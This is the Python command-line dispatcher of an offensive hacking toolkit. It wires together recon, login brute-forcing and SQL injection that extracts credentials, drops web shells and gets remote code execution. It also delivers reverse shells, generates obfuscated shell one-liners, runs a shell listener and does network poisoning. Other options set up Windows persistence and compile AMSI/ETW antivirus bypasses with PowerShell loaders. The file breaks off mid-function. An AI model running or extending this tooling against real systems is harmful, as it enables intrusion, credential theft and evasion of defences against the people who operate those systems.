#!/usr/bin/env python3
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*Diffie-Hellman.*")
warnings.filterwarnings("ignore", message=".*FFDH.*")

import argparse
import asyncio
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

from core.output import banner, info, success, warn, error
from core.http import new_session, RateLimiter, parse_cookie_string
from core import fingerprint
from recon import subdomains, ports, http_probe, urls
from payload import shells, encoders, obfuscators
from vuln import sqli, xss, xss_browser, oob

# Persistence mechanism registry (used by CLI argparse choices)
from vuln.persistence import COM_HIJACK_TARGETS

PERSISTENCE_NAMES = [
    "scheduled_task", "registry_run", "startup_folder",
    "service", "wmi_subscription", "com_hijack",
]


# ---------------------------------------------------------------------
# recon
# ---------------------------------------------------------------------

def cmd_recon(args):
    if getattr(args, "list_investigate_modules", False):
        from recon.investigate import MODULES
        info("Available investigate modules (execution order):")
        for key, description, _path in MODULES:
            print(f"  {key:20s} {description}")
        return

    if args.all:
        asyncio.run(_run_all(args))
    elif getattr(args, "subdeep", False):
        asyncio.run(_recon_subdeep(args))
    elif getattr(args, "doc_harvest", False):
        asyncio.run(_recon_doc_harvest(args))
    elif args.subdomains:
        asyncio.run(subdomains.run(args.target, output_file=args.output, verbose=args.verbose))
    elif args.ports:
        asyncio.run(ports.run(args.target, top=args.top, verbose=args.verbose))
    elif args.http:
        asyncio.run(http_probe.run([args.target], verbose=args.verbose))
    elif args.urls:
        asyncio.run(urls.run(args.target, max_depth=args.depth, rate=args.rate, verbose=args.verbose))
    elif args.cms:
        from recon import cms_fingerprint
        asyncio.run(cms_fingerprint.run(args.target, verbose=args.verbose, output_file=args.output))
    elif args.tech:
        asyncio.run(_recon_tech(args))
    elif args.leaks:
        asyncio.run(_recon_leaks(args))
    elif args.ct_logs:
        asyncio.run(_recon_ct_logs(args))
    elif args.whois:
        asyncio.run(_recon_whois(args))
    elif args.asn:
        asyncio.run(_recon_asn(args))
    elif args.historical:
        asyncio.run(_recon_historical(args))
    elif args.js:
        asyncio.run(_recon_js(args))
    elif args.emails:
        asyncio.run(_recon_emails(args))
    elif args.cloud:
        asyncio.run(_recon_cloud(args))
    elif args.social:
        asyncio.run(_recon_social(args))
    elif args.investigate:
        asyncio.run(_recon_investigate(args))
    else:
        error("pick a recon module: "
              "--subdomains, --ports, --http, --urls, --cms, --all, "
              "--tech, --leaks, --ct-logs, --whois, --asn, --historical, "
              "--js, --emails, --cloud, --social, --investigate")


async def _run_all(args):
    await subdomains.run(args.target, output_file=args.output, verbose=args.verbose)
    await ports.run(args.target, top=args.top, verbose=args.verbose)
    await http_probe.run([args.target], verbose=args.verbose)


async def _recon_doc_harvest(args):
    from recon import document_harvest
    types = None
    if getattr(args, "doc_types", None):
        types = [t.strip().lower().lstrip(".")
                 for t in args.doc_types.split(",") if t.strip()]
    return await document_harvest.run(
        args.target,
        store=getattr(args, "_store", None),
        max_docs=getattr(args, "doc_max", 100),
        extensions=types,
        verbose=args.verbose,
    )


async def _recon_subdeep(args):
    from recon import subdomains_deep
    aliases = None
    if getattr(args, "subdeep_aliases", None):
        aliases = [a.strip() for a in args.subdeep_aliases.split(",")
                    if a.strip()]
    return await subdomains_deep.run(
        args.target,
        store=getattr(args, "_store", None),
        aliases=aliases,
        brute=getattr(args, "subdeep_brute", False)
              or getattr(args, "subdeep_full_brute", False),
        full_brute=getattr(args, "subdeep_full_brute", False),
        rate=getattr(args, "subdeep_rate", 5.0),
        apex_mode=getattr(args, "subdeep_apex", False),
        verbose=args.verbose,
    )


async def _recon_tech(args):
    from recon import tech_fingerprint
    return await tech_fingerprint.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose)


async def _recon_leaks(args):
    from recon import leak_check
    return await leak_check.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose)


async def _recon_ct_logs(args):
    from recon import ct_logs
    return await ct_logs.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose)


async def _recon_whois(args):
    from recon import whois as whois_mod
    return await whois_mod.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose,
        reverse=not args.no_reverse)


async def _recon_asn(args):
    from recon import asn
    return await asn.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose)


async def _recon_historical(args):
    from recon import historical
    return await historical.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose,
        urlscan_key=args.urlscan_key,
        enable_commoncrawl=not getattr(args, "no_commoncrawl", False),
        enable_grep=not getattr(args, "no_grep", False),
        dead_probe_count=getattr(args, "probe_dead", 40),
        retry_profile=getattr(args, "retry_profile", "fast"))


async def _recon_js(args):
    from recon import js_analysis
    return await js_analysis.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose,
        max_js=args.max_js,
        workspace=getattr(args, "_workspace", None),
    )


async def _recon_emails(args):
    from recon import emails
    names = None
    if getattr(args, "names_file", None):
        names = emails.load_names(args.names_file)
    return await emails.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose,
        hunter_key=args.hunter_key,
        verify=args.verify_emails,
        names=names,
        enable_patterns=getattr(args, "patterns", False),
        min_confidence=getattr(args, "min_confidence", 0.5))


async def _recon_cloud(args):
    from recon import cloud_enum
    return await cloud_enum.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose,
        providers=args.cloud_provider)


async def _recon_social(args):
    from recon import social
    return await social.run(
        args.target,
        store=getattr(args, "_store", None),
        verbose=args.verbose,
        verify=not args.no_verify,
        github_token=getattr(args, "github_token", None),
        github_org=getattr(args, "github_org", None),
        names_out=getattr(args, "names_out", None),
    )


async def _recon_investigate(args):
    from recon import investigate
    return await investigate.run(
        args.target,
        output=args.output,
        skip=args.skip.split(",") if args.skip else None,
        only=args.only.split(",") if args.only else None,
        parallel=args.parallel,
        verbose=args.verbose,
        want_json=args.json,
        store=getattr(args, "_store", None),
        workspace=getattr(args, "_workspace", None))


# ---------------------------------------------------------------------
# brute
# ---------------------------------------------------------------------

def cmd_brute(args):
    asyncio.run(_run_brute(args))


async def _run_brute(args):
    from vuln import auth_bruteforce

    login_url = args.url
    if not login_url.startswith(("http://", "https://")):
        login_url = f"http://{login_url}"

    emails = args.email or auth_bruteforce.BUILTIN_EMAILS

    passwords = []
    if args.wordlist:
        passwords.extend(auth_bruteforce.load_wordlist(args.wordlist))
    if args.password:
        passwords.extend(args.password)
    if not passwords:
        passwords = auth_bruteforce.BUILTIN_PASSWORDS

    info(f"brute-force target: {login_url}")
    info(f"emails: {len(emails)}, passwords: {len(passwords)}")
    info(f"rate: {args.rate}/s"
         + (f", max attempts: {args.max_attempts}" if args.max_attempts else ""))

    result = await auth_bruteforce.brute_force(
        login_url,
        emails=emails,
        passwords=passwords,
        email_field=args.email_field,
        password_field=args.password_field,
        success_marker=args.success_marker,
        failure_marker=args.failure_marker,
        rate=args.rate,
        verbose=args.verbose,
        max_attempts=args.max_attempts,
    )

    print()
    if result["credential"]:
        success(f"credential found: "
                f"{result['credential']['email']}:{result['credential']['password']}")
        success(f"after {result['attempts']} attempts "
                f"({result['elapsed']:.1f}s)")
    else:
        warn(f"no credential found after {result['attempts']} attempts "
             f"({result['elapsed']:.1f}s)")

    if args.output:
        report = {
            "target": login_url,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "type": "bruteforce",
            "credential": result.get("credential"),
            "attempts": result.get("attempts"),
            "elapsed": result.get("elapsed"),
        }
        Path(args.output).write_text(json.dumps(report, indent=2, default=str))
        success(f"report saved to {args.output}")


# ---------------------------------------------------------------------
# oob
# ---------------------------------------------------------------------

async def _oob_context(args):
    if not args.oob:
        return None, None

    from vuln import oob
    dns = oob.DNSListener(port=args.oob_dns_port, verbose=args.verbose)
    http = oob.OOBListener(port=args.oob_http_port, verbose=args.verbose)

    try:
        await dns.start()
    except RuntimeError as e:
        error(f"DNS listener failed: {e}")
        return None, None
    try:
        await http.start()
    except RuntimeError as e:
        error(f"HTTP listener failed: {e}")
        await dns.stop()
        return None, None

    config = oob.OOBConfig(
        dns_listener=dns,
        http_listener=http,
        public_host=args.oob_public,
    )

    async def cleanup():
        await dns.stop()
        await http.stop()

    return config, cleanup


# ---------------------------------------------------------------------
# network
# ---------------------------------------------------------------------

def cmd_network(args):
    try:
        if args.passive:
            asyncio.run(_network_passive(args))
        elif args.audit:
            asyncio.run(_run_network_audit(args))
        elif args.discover:
            asyncio.run(_network_discover(args))
        elif args.ports:
            asyncio.run(_network_ports(args))
        elif args.services:
            asyncio.run(_network_services(args))
        elif args.topology:
            asyncio.run(_network_topology(args))
        elif args.os:
            asyncio.run(_network_os(args))
        elif args.cve:
            asyncio.run(_network_cve(args))
        elif args.snmp:
            asyncio.run(_network_snmp(args))
        elif args.poison:
            asyncio.run(_network_poison(args))
        elif args.multicast:
            asyncio.run(_network_multicast(args))
        else:
            error("pick a network module: --discover, --ports, --services, "
                  "--topology, --os, --cve, --snmp, --poison, --multicast, "
                  "--passive, --audit")
    except ModuleNotFoundError as e:
        error(f"missing dependency: {e.name}")
        error("run: pip install scapy psutil packaging pysnmp-lextudio")
        sys.exit(1)


async def _network_discover(args):
    from net import host_discovery
    return await host_discovery.run(
        args.target, timeout_scale=args.timeout_scale,
        use_tcp_fallback=not args.no_tcp_fallback, verbose=args.verbose,
        stealth=args.stealth, max_pps=args.max_pps)


async def _network_ports(args):
    from net import port_scanner
    return await port_scanner.run(
        args.target, ports_arg=args.ports_list, top=args.top,
        timeout=args.timeout, verbose=args.verbose,
        stealth=args.stealth, max_pps=args.max_pps)


async def _network_passive(args):
    from net import passive_discovery
    return await passive_discovery.run(
        args.target, duration=args.passive_seconds, verbose=args.verbose)


async def _network_services(args):
    from net import service_fingerprint
    return await service_fingerprint.run(
        args.target, ports_arg=args.ports_list, top=args.top,
        verbose=args.verbose)


async def _network_topology(args):
    from net import topology
    return await topology.run(
        args.target, max_hops=args.max_hops, timeout=args.timeout,
        verbose=args.verbose)


async def _network_os(args):
    from net import os_fingerprint
    return await os_fingerprint.run(args.target, verbose=args.verbose)


async def _network_cve(args):
    from net import vuln_match
    return await vuln_match.run(
        args.target, ports_arg=args.ports_list, top=args.top,
        verbose=args.verbose)


async def _network_snmp(args):
    from net import snmp
    return await snmp.run(
        args.target,
        store=getattr(args, "_store", None),
        communities=args.community,
        community_file=args.community_file,
        timeout=args.timeout,
        verbose=args.verbose)


async def _network_poison(args):
    from net import poison
    return await poison.run(
        duration=args.poison_duration,
        active=args.poison_active,
        authorized_by=args.authorized_by,
        interface=args.interface,
        verbose=args.verbose,
        wordlist=args.wordlist,
        store=getattr(args, "_store", None),
        workspace=getattr(args, "_workspace", None),
        smb_port=args.smb_port,
        http_port=args.http_port)


async def _network_multicast(args):
    from net import multicast
    return await multicast.run(
        store=getattr(args, "_store", None),
        workspace=getattr(args, "_workspace", None),
        duration=args.duration,
        protocols=args.protocol or None,
        fetch_descriptions=not args.no_descriptions,
        verbose=args.verbose)


async def _run_network_audit(args):
    from net import (host_discovery, port_scanner, service_fingerprint,
                     os_fingerprint, vuln_match, exporters)
    from net.util import SendStrategy

    strategy = SendStrategy(stealth=args.stealth, max_pps=args.max_pps)
    info("network audit: full chain")
    if args.stealth:
        info(f"stealth mode: max {strategy.max_pps} pps, jitter {strategy.jitter}")

    subnets = [args.target] if "/" in args.target else [f"{args.target}/32"]
    inventory = await host_discovery.discover(
        subnets, timeout_scale=args.timeout_scale,
        use_tcp_fallback=not args.no_tcp_fallback,
        verbose=args.verbose, strategy=strategy)

    if not inventory:
        warn("no hosts found; nothing else to do")
        return {}

    from net.port_scanner import _parse_ports
    ports = _parse_ports(args.ports_list, args.top)
    open_map = await port_scanner.scan_hosts(
        list(inventory.keys()), ports,
        timeout=args.timeout, verbose=args.verbose, strategy=strategy)

    for ip, open_ports in open_map.items():
        if ip in inventory:
            inventory[ip]["open_ports"] = open_ports

    to_fp = {ip: ports for ip, ports in open_map.items() if ports}
    if to_fp:
        fp = await service_fingerprint.fingerprint_many(
            to_fp, timeout=args.timeout + 2.0, verbose=args.verbose)
        for ip, services in fp.items():
            inventory[ip]["services"] = services

    if args.os_fp:
        os_results = await os_fingerprint.fingerprint_many(
            list(inventory.keys()), verbose=args.verbose)
        for ip, os_r in os_results.items():
            inventory[ip]["os_guess"] = os_r.get("ttl_guess", "")

    fp_only = {ip: h.get("services", []) for ip, h in inventory.items()
               if h.get("services")}
    if fp_only:
        cves = vuln_match.scan_services(fp_only)
        for ip, hits in cves.items():
            inventory[ip]["cves"] = hits

    if args.output:
        out = args.output
        if out.endswith(".json"):
            exporters.export_json(inventory, out)
        elif out.endswith(".csv"):
            exporters.export_csv(inventory, out)
        elif out.endswith(".html"):
            exporters.export_html(inventory, out)
        else:
            exporters.export_html(inventory, out + ".html")
            exporters.export_json(inventory, out + ".json")

    return inventory


# ---------------------------------------------------------------------
# payload
# ---------------------------------------------------------------------

def cmd_payload_generate(args):
    """Generate a shell one-liner (the old cmd_payload)."""
    if not getattr(args, "lhost", None):
        error("payload generate requires --lhost and --lport")
        return

    if args.context:
        shell_type, raw = shells.generate_for_context(
            args.context, args.lhost, args.lport)
        if raw is None:
            error(f"unknown context: {args.context}")
            return
        info(f"context '{args.context}' → using {shell_type} shell")
    else:
        shell_type = args.type
        if not shell_type:
            error("payload generate requires --type or --context")
            return
        raw = shells.generate(shell_type, args.lhost, args.lport)
        if raw is None:
            error(f"unknown payload type: {args.type}")
            return

    if args.encode:
        raw = encoders.encode(raw, args.encode)

    if args.obfuscate:
        method = args.obfuscate
        if method == "list":
            methods = obfuscators.list_methods(shell_type)
            info(f"available obfuscation methods for {shell_type}: "
                 f"{', '.join(methods) or '(none)'}")
            return
        raw = obfuscators.obfuscate(raw, shell_type, method)
        info(f"applied obfuscation: {method}")

    print()
    print(raw)
    print()


def cmd_payload_compile(args):
    """Compile source into a runnable artifact."""
    from payload import framework

    if not args.source:
        error("payload compile requires --source <file>")
        return

    source_path = Path(args.source)
    if not source_path.exists():
        error(f"source not found: {source_path}")
        return

    source = source_path.read_text(encoding="utf-8")

    extra = {}
    if args.language == "csharp":
        if args.output_type:
            extra["__output_type"] = args.output_type
        extra["__assembly_name"] = args.name
        extra["__namespace"] = args.name
        # net48 is the default because Windows PowerShell 5.1 (the
        # ubiquitous Windows shell) runs on .NET Framework 4.8.
        target = args.target or "net48"
    else:
        if args.output_type:
            extra["__output_type"] = args.output_type
        else:
            extra["__output_type"] = "dll"
        extra["__output_name"] = args.name
        target = args.target or "windows-x64"

    post = []
    for name in (args.post or []):
        post.append(name)

    p = framework.Payload(
        language=args.language,
        source=source,
        target=target,
        extra_files=extra,
        post_processing=framework.make_post_chain(post),
        description=f"{args.language} {args.name}",
    )

    info(f"compiling {args.language} payload ({target}, "
         f"{args.name})...")
    try:
        p.build(verbose=args.verbose)
    except framework.BuildError as e:
        error(f"compile failed: {e}")
        return

    if p.from_cache:
        success(f"cache hit: {p.cache_key()}")
    else:
        success(f"compiled in {p.build_elapsed:.1f}s "
                f"({len(p.built_bytes)} bytes)")
    info(f"  cache: {p.built_path}")
    info(f"  format: {p.built_extension}")

    if args.output:
        out = Path(args.output)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_bytes(p.built_bytes)
        success(f"wrote {out}")

    if args.store:
        workspace = getattr(args, "_workspace", None)
        if workspace is None:
            warn("no active workspace; skipping --store")
        else:
            saved = p.save(workspace)
            success(f"saved to workspace: {saved}")


def cmd_payload_check(args):
    """Print toolchain detection."""
    from payload import compilers
    print()
    print(compilers.summary())


# ---------------------------------------------------------------------
# scan
# ---------------------------------------------------------------------

def _parse_headers(pairs):
    out = {}
    for p in pairs or []:
        if ":" not in p:
            warn(f"ignoring malformed header: {p!r}")
            continue
        k, v = p.split(":", 1)
        out[k.strip()] = v.strip()
    return out


def _read_body(args):
    if getattr(args, "body_file", None):
        return Path(args.body_file).read_text(encoding="utf-8")
    return args.body


def cmd_scan(args):
    if args.demo_cookie or args.demo_exfil:
        asyncio.run(_run_xss_demo(args))
        return
    if args.xss:
        asyncio.run(_run_xss_scan(args))
        return
    if args.nosql:
        asyncio.run(_run_nosql_scan(args))
        return
    asyncio.run(_run_scan(args))


async def _run_scan(args):
    url = args.url
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"

    if args.extract_chars is not None:
        sqli.MAX_EXTRACT_CHARS = args.extract_chars
    if args.extract_timeout is not None:
        sqli.MAX_EXTRACT_SECONDS = args.extract_timeout

    if args.shell and getattr(args, "sqlite_shell_path", None):
        sqli.SQLITE_SHELL_PATH = args.sqlite_shell_path
    else:
        sqli.SQLITE_SHELL_PATH = None

    body = _read_body(args)

    if getattr(args, "login_url", None):
        try:
            from recon import session_capture
        except ImportError:
            warn("--login-url was given but recon/session_capture.py "
                 "is missing; proceeding unauthenticated")
        else:
            info(f"capturing session via {args.login_url}")
            login_result = await session_capture.capture_session(
                args.login_url,
                email_field=args.login_email_field,
                password_field=args.login_password_field,
                email=args.login_email,
                password=args.login_password,
                success_marker=args.login_success_marker,
                verbose=args.verbose,
            )
            if login_result["success"]:
                args.cookie = session_capture.cookies_to_header(
                    login_result["cookies"])
                success(f"session captured "
                        f"({len(login_result['cookies'])} cookies)")
            else:
                warn(f"session capture failed: "
                     f"{login_result.get('error') or 'no marker matched'}")

    cookies = parse_cookie_string(args.cookie) if args.cookie else None
    content_type = args.content_type
    limiter = RateLimiter(rate=args.rate)
    session = new_session()

    info(f"scanning {url} (method={args.method}, rate={args.rate}/s"
         + (", evade=on" if args.evade else "")
         + (", extract=off" if args.no_extract else "")
         + (", blind=off" if args.no_blind else "")
         + (f", chars={args.extract_chars}" if args.extract_chars else "")
         + (", shell=on" if args.shell else "")
         + (", aggressive=on" if args.aggressive else "")
         + (f", sqlite-path={args.sqlite_shell_path}"
            if args.shell and getattr(args, "sqlite_shell_path", None)
            else "")
         + (", authenticated" if cookies else "")
         + ")")

    oob_config, oob_cleanup = await _oob_context(args)

    try:
        findings = await sqli.test_url(
            url, session, limiter,
            cookies=cookies,
            verbose=args.verbose,
            auto_extract=not args.no_extract,
            include_headers=args.include_headers,
            method=args.method,
            body=body,
            content_type=content_type,
            allow_stacked=True,
            evade=args.evade,
            blind_probe=not args.no_blind,
            oob_config=oob_config,
            drop_shell=args.shell,
            aggressive=args.aggressive,
        )
    finally:
        if oob_cleanup is not None:
            await oob_cleanup()

    report_findings = [f for f in findings if f.get("type") != "csrf_tokens"]
    csrf_record = next((f for f in findings if f.get("type") == "csrf_tokens"), None)

    print()
    if not report_findings:
        info("no SQLi findings")
    else:
        success(f"{len(report_findings)} finding(s)")
        for f in report_findings:
            mut = f" mut={f['mutation_used']}" if "mutation_used" in f else ""
            print(f"  [{f['severity']}] {f['injection_kind']}:{f['parameter']} "
                  f"({f.get('dbms', '?')}){mut}")
            if "note" in f:
                print(f"      note: {f['note']}")
            if "extracted_data" in f:
                ed = f["extracted_data"]
                if "db_version" in ed:
                    print(f"      db_version: {ed['db_version']}")
                if "tables" in ed:
                    print(f"      tables: {len(ed['tables'])}")
                if "credentials" in ed:
                    print(f"      credentials: {len(ed['credentials'])}")
                    for c in ed["credentials"][:5]:
                        print(f"        {c}")
                if "shell" in ed and ed["shell"].get("success"):
                    sh = ed["shell"]
                    verified = " [VERIFIED]" if sh.get("verified") else ""
                    print(f"      shell: {sh.get('shell_url')}{verified}")
                    print(f"             path: {sh.get('shell_path')}")
                if "rce" in ed:
                    r = ed["rce"]
                    print(f"      rce:   {r.get('method')}")
                    print(f"             cmd: {r.get('cmd')}")
                    out = (r.get("output") or "").strip()
                    if out:
                        for line in out.splitlines()[:10]:
                            print(f"             | {line}")
                if "sqlite_load_extension" in ed:
                    ext = ed["sqlite_load_extension"]
                    if ext is True:
                        print(f"      sqlite load_extension: AVAILABLE")
                    elif ext is False:
                        print(f"      sqlite load_extension: not authorized")
                if "shell_skipped" in ed:
                    print(f"      shell skipped: {ed['shell_skipped']}")

    if csrf_record and csrf_record.get("tokens"):
        info(f"csrf tokens cached: {', '.join(csrf_record['tokens'])}")

    # ---- Optional: deliver a payload through RCE ----
    if getattr(args, "deliver", None) and report_findings:
        from vuln import deliver as deliver_mod
        from vuln.sqli import InjectionPoint, TokenJar

        # Find a finding that looks RCE-deliverable
        deliver_point = None
        deliver_dbms = None

        for f in report_findings:
            if f.get("type") != "sqli":
                continue

            dbms = f.get("dbms") or "mysql"
            if dbms == "generic":
                dbms = "mysql"
            if dbms not in ("mssql", "mysql", "postgres"):
                continue

            try:
                point = InjectionPoint(
                    kind=f["injection_kind"],
                    name=f["parameter"],
                    url=f.get("url") or url,
                    method=f.get("method", "GET"),
                    cookies=cookies,
                    body=body,
                    content_type=content_type,
                )
                point.dbms = dbms
                deliver_point = point
                deliver_dbms = dbms
                break
            except Exception as e:
                warn(f"  could not rebuild point for {f['parameter']!r}: "
                     f"{type(e).__name__}: {e}")
                continue

        if deliver_point is None:
            warn("no RCE-deliverable point found in findings")
        else:
            info("")
            info(f"delivering payload {args.deliver!r} via "
                 f"{deliver_dbms} on "
                 f"{deliver_point.kind}:{deliver_point.name}")

            payload_params = {}
            skip_delivery = False
            if args.deliver == "reverse_shell":
                if not getattr(args, "deliver_lhost", None) or \
                        not getattr(args, "deliver_lport", None):
                    warn("  reverse_shell delivery requires "
                         "--deliver-lhost and --deliver-lport")
                    skip_delivery = True
                else:
                    payload_params = {
                        "lhost": args.deliver_lhost,
                        "lport": args.deliver_lport,
                    }

            if not skip_delivery:
                deliver_jar = TokenJar()
                try:
                    result = await deliver_mod.deliver_by_name(
                        session, deliver_point, limiter, deliver_dbms,
                        args.deliver,
                        payload_params=payload_params,
                        jar=deliver_jar,
                        verbose=args.verbose)
                except Exception as e:
                    warn(f"  delivery exception: "
                         f"{type(e).__name__}: {e}")
                    result = None

                if result is not None:
                    print()
                    if result["success"]:
                        success(f"payload delivered via "
                                f"{result['method']}")
                        output = (result.get("output") or "").strip()
                        if output:
                            info("  output:")
                            lines_out = output.splitlines()
                            for line in lines_out[:50]:
                                print(f"    {line}")
                            if len(lines_out) > 50:
                                info(f"    ... and "
                                     f"{len(lines_out) - 50} more lines")
                    else:
                        warn(f"delivery failed: {result.get('error')}")

                    for f in report_findings:
                        if (f.get("injection_kind") ==
                                deliver_point.kind and
                                f.get("parameter") ==
                                deliver_point.name):
                            f["delivered_payload"] = {
                                "name": args.deliver,
                                "params": payload_params,
                                "success": result["success"],
                                "method": result["method"],
                                "output_preview": (
                                    result.get("output") or "")[:500],
                                "error": result.get("error"),
                            }
                            break

    await session.close()

    if args.output:
        report = {
            "target": url,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "method": args.method,
            "evade": bool(args.evade),
            "findings": report_findings,
            "csrf_tokens": csrf_record["tokens"] if csrf_record else [],
        }
        Path(args.output).write_text(json.dumps(report, indent=2, default=str))
        success(f"report saved to {args.output}")


async def _run_xss_scan(args):
    url = args.url
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    await xss.run(
        url,
        cookies=args.cookie,
        rate=args.rate,
        verbose=args.verbose,
        evade=args.evade,
    )


async def _run_nosql_scan(args):
    from vuln import nosqli

    url = args.url
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"

    body = _read_body(args)

    if not body:
        error("--nosql requires --body or --body-file with a JSON payload")
        return

    cookies = parse_cookie_string(args.cookie) if args.cookie else None
    limiter = RateLimiter(rate=args.rate)
    session = new_session()

    info(f"nosqli: scanning {url} (method={args.method}, rate={args.rate}/s)")

    try:
        findings = await nosqli.test_url(
            url, session, limiter,
            cookies=cookies,
            verbose=args.verbose,
            method=args.method,
            body=body,
            content_type=args.content_type or "application/json",
            do_extract=not args.no_extract,
        )
    finally:
        await session.close()

    print()
    if not findings:
        info("no NoSQLi findings")
    else:
        success(f"{len(findings)} finding(s)")
        for f in findings:
            print(f"  [{f['severity']}] {f['injection_kind']}:{f['parameter']} "
                  f"({f.get('dbms', '?')})")
            if "evidence" in f:
                print(f"      {f['evidence']}")
            if "extracted_data" in f:
                ed = f["extracted_data"]
                if "prefix" in ed:
                    print(f"      prefix: {ed['prefix']!r}")

    if args.output:
        report = {
            "target": url,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "method": args.method,
            "type": "nosql",
            "findings": findings,
        }
        Path(args.output).write_text(json.dumps(report, indent=2, default=str))
        success(f"report saved to {args.output}")


async def _run_xss_demo(args):
    url = args.url
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"

    if args.demo_cookie:
        info("running DOM cookie-display demo (no network exfiltration)")
        result = await xss.run_cookie_demo(
            url, cookies=args.cookie, rate=args.rate, verbose=args.verbose)
        if result is None:
            error("demo failed")
        return

    if args.demo_exfil:
        info("running LOCALHOST-ONLY cookie exfil demo")
        warn("the listener is on 127.0.0.1; nothing leaves this machine")
        result = await xss.run_exfil_demo(
            url, cookies=args.cookie, rate=args.rate, verbose=args.verbose)
        if result is None:
            error("demo failed")
        return


# ---------------------------------------------------------------------
# shell listener
# ---------------------------------------------------------------------

def cmd_shell_listen(args):
    """Run the reverse-shell listener."""
    from core import shell_handler

    store = getattr(args, "_store", None)
    workspace = getattr(args, "_workspace", None)

    try:
        asyncio.run(shell_handler.listen(
            host=args.host,
            port=args.port,
            store=store,
            workspace=workspace,
            shell_type=args.tag,
            verbose=args.verbose,
        ))
    except KeyboardInterrupt:
        info("listener stopped")


# ---------------------------------------------------------------------
# evade
# ---------------------------------------------------------------------

def cmd_evade_list(args):
    """List bypass techniques and chains."""
    from evade import av_bypass, chains

    print()
    print("AMSI / ETW bypass techniques:")
    print()
    for t in av_bypass.list_techniques():
        status = t.get("status", "untested")
        marker = {
            "works": "  [WORKS]",
            "caught": " [CAUGHT]",
            "broken": " [BROKEN]",
            "untested": "   [ ? ]",
        }.get(status, "   [ ? ]")
        print(f"  {t['name']:22s} [{t['kind']:4s}] "
              f"{marker:10s} {t['description']}")

    print()
    print("Preset chains:")
    print()
    for preset in chains.list_presets():
        print(f"  {preset['name']:15s} {preset['description']}")
        print(f"      {' → '.join(preset['techniques'])}")

    print()
    print("Chain compilation:")
    print("  py toolkit.py evade chain <preset-or-csv> [--show-loader]")
    print()


def cmd_evade_compile(args):
    """Compile one or all bypass techniques."""
    from evade import av_bypass

    if args.technique:
        names = [args.technique]
        if args.technique not in av_bypass.TECHNIQUES:
            error(f"unknown technique: {args.technique}")
            info(f"  available: {', '.join(sorted(av_bypass.TECHNIQUES))}")
            return
    else:
        names = sorted(av_bypass.TECHNIQUES)

    info(f"compiling {len(names)} technique(s)...")
    results = {}
    for name in names:
        try:
            p = av_bypass.compile(name, verbose=args.verbose)
            results[name] = p
            if p.from_cache:
                success(f"  {name}: cache hit ({len(p.built_bytes)} bytes)")
            else:
                success(f"  {name}: compiled in {p.build_elapsed:.1f}s "
                        f"({len(p.built_bytes)} bytes)")
            info(f"    cache: {p.built_path}")
        except Exception as e:
            error(f"  {name}: {type(e).__name__}: {e}")

    if args.output and len(results) == 1:
        p = next(iter(results.values()))
        out_path = Path(args.output)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_bytes(p.built_bytes)
        success(f"wrote {out_path}")

        if args.show_loader:
            print()
            info("PowerShell loader:")
            print()
            print(av_bypass.loader_ps1(next(iter(results)), str(out_path)))

    if args.store:
        workspace = getattr(args, "_workspace", None)
        if workspace is None:
            warn("no active workspace; skipping --store")
        else:
            for name, p in results.items():
                try:
                    saved = p.save(workspace,
                                    filename=f"av_bypass_{name}.dll")
                    success(f"  saved {name} → {saved}")
                except Exception as e:
                    warn(f"  could not save {name}: {e}")

    print()
    success(f"done: {len(results)}/{len(names)} built")


def cmd_evade_chain(args):
    """Compile a chain of evasion techniques."""
    from evade import chains

    if args.list_presets:
        print()
        print("Preset chains:")
        print()
        for preset in chains.list_presets():
            marker = " [modern]" if preset.get("modern") else ""
            print(f"  {preset['name']:15s} {preset['description']}{marker}")
            print(f"      {' → '.join(preset['techniques'])}")
        print()
        return

    if not args.chain:
        error("no chain specified (use --list-presets to see options)")
        return

    try:
        names = chains.resolve_chain(args.chain)
    except ValueError as e:
        error(str(e))
        return

    info(f"compiling chain: {' → '.join(names)}")
    try:
        chain = chains.compile_chain(names, verbose=args.verbose)
    except Exception as e:
        error(f"chain compile failed: {type(e).__name__}: {e}")
        return

    p = chain.payload
    if p.from_cache:
        success(f"  cache hit ({len(p.built_bytes)} bytes)")
    else:
        success(f"  compiled in {p.build_elapsed:.1f}s "
                f"({len(p.built_bytes)} bytes)")
    info(f"  cache: {p.built_path}")

    if args.output:
        out_path = Path(args.output)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_bytes(p.built_bytes)
        success(f"wrote {out_path}")

        if args.show_loader:
            print()
            info("PowerShell loader:")
            print()
            print(chains.loader_ps1(chain, str(out_path)))

    if args.store:
        workspace = getattr(args, "_workspace", None)
        if workspace is None:
            warn("no active workspace; skipping --store")
        else:
            try:
                saved = p.save(
                    workspace,
                    filename=f"evade_chain_{chain.name}.dll")
                success(f"saved to workspace: {saved}")
            except Exception as e:
                warn(f"could not save to workspace: {e}")


def cmd_evade_deliver(args):
    """Wrap a PowerShell script with an AMSI bypass."""
    from evade import delivery

    if args.script == "-":
        script = sys.stdin.read()
    else:
        p = Path(args.script)
        if not p.exists():
            error(f"script not found: {args.script}")
            return
        script = p.read_text(encoding="utf-8")

    if not script.strip():
        error("script is empty")
        return

    info(f"wrapping {len(script)} bytes of PowerShell")

    try:
        if args.chain:
            wrapped = delivery.wrap_chain(
                script, args.chain,
                compact=not args.pretty,
                verbose=args.verbose)
        else:
            wrapped = delivery.wrap_script(
                script,
                bypass=args.bypass or delivery.DEFAULT_BYPASS,
